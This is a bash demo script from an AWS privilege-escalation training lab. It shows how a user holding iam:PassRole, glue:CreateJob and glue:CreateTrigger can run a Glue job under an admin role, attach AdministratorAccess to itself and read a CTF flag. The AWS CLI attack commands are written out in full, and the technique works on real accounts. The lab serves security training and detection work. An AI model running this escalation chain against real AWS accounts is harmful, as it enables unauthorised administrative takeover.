#!/bin/bash

# Demo script for iam:PassRole + glue:CreateJob + glue:CreateTrigger privilege escalation
# This scenario demonstrates how a user with PassRole, CreateJob, and CreateTrigger can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-004-to-admin-starting-user"
TARGET_ROLE="pl-prod-glue-004-to-admin-target-role"
RANDOM_SUFFIX=$(date +%s | tail -c 6)
JOB_NAME="pl-glue-004-demo-job-${RANDOM_SUFFIX}"
TRIGGER_NAME="pl-glue-004-demo-trigger-${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue CreateJob + CreateTrigger Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_004_iam_passrole_glue_createjob_glue_createtrigger.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID (using readonly creds)
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Retrieve pre-uploaded script location from Terraform
echo -e "${YELLOW}Step 5: Retrieving pre-uploaded Glue job script from Terraform${NC}"

SCRIPT_S3_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.script_s3_path')
SCRIPT_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.script_bucket_name')

if [ "$SCRIPT_S3_PATH" == "null" ] || [ -z "$SCRIPT_S3_PATH" ]; then
    echo -e "${RED}Error: Could not retrieve script S3 path from terraform output${NC}"
    exit 1
fi

echo "Script S3 path: $SCRIPT_S3_PATH"
echo "Script bucket: $SCRIPT_BUCKET"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The Python script is hosted in an attacker-controlled S3 bucket. The bucket policy${NC}"
echo -e "${BLUE}  grants the prod account read access (not via IAM, but via resource policy).${NC}"
echo -e "${BLUE}  If an attacker account is configured, this bucket lives in a separate AWS account.${NC}"
echo ""
echo -e "${GREEN}✓ Retrieved script location from Terraform${NC}\n"

# Step 6: Create Glue Python shell job with admin role
echo -e "${YELLOW}Step 6: Creating Glue job with admin role${NC}"
use_starting_creds
echo "This is the privilege escalation vector - passing the admin role to Glue..."
echo "Job name: $JOB_NAME"
echo "Target role: $TARGET_ROLE"

TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"

show_attack_cmd "Attacker" "aws glue create-job --region $AWS_REGION --name \"$JOB_NAME\" --role \"$TARGET_ROLE_ARN\" --command \"Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9\" --default-arguments '{\"--job-language\":\"python\"}' --max-capacity 0.0625 --timeout 5 --output json"
aws glue create-job \
    --region $AWS_REGION \
    --name "$JOB_NAME" \
    --role "$TARGET_ROLE_ARN" \
    --command "Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9" \
    --default-arguments '{"--job-language":"python"}' \
    --max-capacity 0.0625 \
    --timeout 5 \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created Glue job: $JOB_NAME${NC}"
else
    echo -e "${RED}Error: Failed to create Glue job${NC}"
    exit 1
fi
echo ""

# Step 7: Create scheduled trigger that starts immediately
echo -e "${YELLOW}Step 7: Creating trigger that starts immediately${NC}"
echo "Trigger name: $TRIGGER_NAME"
echo "Using scheduled trigger with --start-on-creation flag..."

show_attack_cmd "Attacker" "aws glue create-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --type SCHEDULED --start-on-creation --schedule \"cron(0/1 * * * ? *)\" --actions '[{\"JobName\": \"'$JOB_NAME'\"}]' --output json"
aws glue create-trigger \
    --region $AWS_REGION \
    --name "$TRIGGER_NAME" \
    --type SCHEDULED \
    --start-on-creation \
    --schedule "cron(0/1 * * * ? *)" \
    --actions '[{"JobName": "'$JOB_NAME'"}]' \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created trigger: $TRIGGER_NAME${NC}"
    echo "The trigger will fire immediately and run the job"
else
    echo -e "${RED}Error: Failed to create trigger${NC}"
    exit 1
fi
echo ""

# [OBSERVATION]
# Step 8: Wait for trigger to fire and job to complete
use_readonly_creds
echo -e "${YELLOW}Step 8: Waiting for trigger to fire and job to complete${NC}"
echo "Note: Scheduled triggers fire at the next scheduled time (every minute in this case)"
echo "This may take 1-3 minutes depending on when in the minute cycle we created the trigger..."
echo ""

# Check trigger state
echo "Verifying trigger state..."
show_cmd "ReadOnly" "aws glue get-trigger --region $AWS_REGION --name \"$TRIGGER_NAME\" --query 'Trigger.State' --output text"
TRIGGER_STATE=$(aws glue get-trigger \
    --region $AWS_REGION \
    --name "$TRIGGER_NAME" \
    --query 'Trigger.State' \
    --output text 2>/dev/null)

echo "Trigger state: $TRIGGER_STATE"
if [ "$TRIGGER_STATE" != "ACTIVATED" ]; then
    echo -e "${YELLOW}Warning: Trigger is not in ACTIVATED state${NC}"
fi
echo ""

MAX_WAIT=180  # 3 minutes
ELAPSED=0
JOB_RUN_ID=""

# Wait for the job run to be initiated
echo "Waiting for trigger to fire and job to run (checking every 10 seconds)..."

while [ $ELAPSED -lt $MAX_WAIT ]; do
    # Get the latest job run
    JOB_RUNS=$(aws glue get-job-runs \
        --region $AWS_REGION \
        --job-name "$JOB_NAME" \
        --max-results 1 \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        JOB_RUN_ID=$(echo "$JOB_RUNS" | jq -r '.JobRuns[0].Id // empty')

        if [ -n "$JOB_RUN_ID" ]; then
            JOB_RUN_STATE=$(echo "$JOB_RUNS" | jq -r '.JobRuns[0].JobRunState')

            echo "  [${ELAPSED}s] Job run $JOB_RUN_ID: $JOB_RUN_STATE"

            if [ "$JOB_RUN_STATE" = "SUCCEEDED" ]; then
                echo -e "${GREEN}✓ Job run completed successfully!${NC}"
                break
            elif [ "$JOB_RUN_STATE" = "FAILED" ] || [ "$JOB_RUN_STATE" = "ERROR" ] || [ "$JOB_RUN_STATE" = "STOPPED" ]; then
                echo -e "${RED}✗ Job run failed with state: $JOB_RUN_STATE${NC}"
                echo "Fetching error details..."
                aws glue get-job-run \
                    --region $AWS_REGION \
                    --job-name "$JOB_NAME" \
                    --run-id "$JOB_RUN_ID" \
                    --query 'JobRun.ErrorMessage' \
                    --output text
                exit 1
            fi
        else
            echo "  [${ELAPSED}s] Waiting for trigger to fire..."
        fi
    fi

    sleep 10
    ELAPSED=$((ELAPSED + 10))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Timeout waiting for job to complete${NC}"
    echo ""
    echo "Trigger state at timeout:"
    aws glue get-trigger \
        --region $AWS_REGION \
        --name "$TRIGGER_NAME" \
        --output json | jq '{State: .Trigger.State, Schedule: .Trigger.Schedule}'
    echo ""
    echo "Checking if any job runs exist:"
    aws glue get-job-runs \
        --region $AWS_REGION \
        --job-name "$JOB_NAME" \
        --output json | jq '.JobRuns | length'
    exit 1
fi
echo ""

# Step 9: Wait for IAM policy propagation
echo -e "${YELLOW}Step 9: Waiting for IAM policy to propagate${NC}"
echo "Waiting 15 seconds for AdministratorAccess policy to take effect..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION]
# Step 10: Verify admin access
use_readonly_creds
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Checking if AdministratorAccess is now attached to starting user..."

show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
    exit 1
fi
echo ""
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT]
# Step 11: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-004-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Retrieved pre-uploaded Python script from S3 (deployed by Terraform)"
echo "3. Created Glue job: $JOB_NAME with admin role $TARGET_ROLE"
echo "4. Created scheduled trigger: $TRIGGER_NAME with --start-on-creation"
echo "5. Trigger fired immediately and executed the job"
echo "6. Job attached AdministratorAccess policy to starting user"
echo "7. Achieved: Administrator Access"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (iam:PassRole + glue:CreateJob) → $JOB_NAME with $TARGET_ROLE"
echo -e "  → (glue:CreateTrigger --start-on-creation) → $TRIGGER_NAME"
echo -e "  → Job executes with admin role"
echo -e "  → Attaches AdministratorAccess to $STARTING_USER"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Glue Job: $JOB_NAME (remains as demo artifact)"
echo "- Glue Trigger: $TRIGGER_NAME"
echo "- IAM Policy Attachment: AdministratorAccess on $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The Glue job and trigger are still deployed${NC}"
echo -e "${RED}⚠ The starting user still has AdministratorAccess attached${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
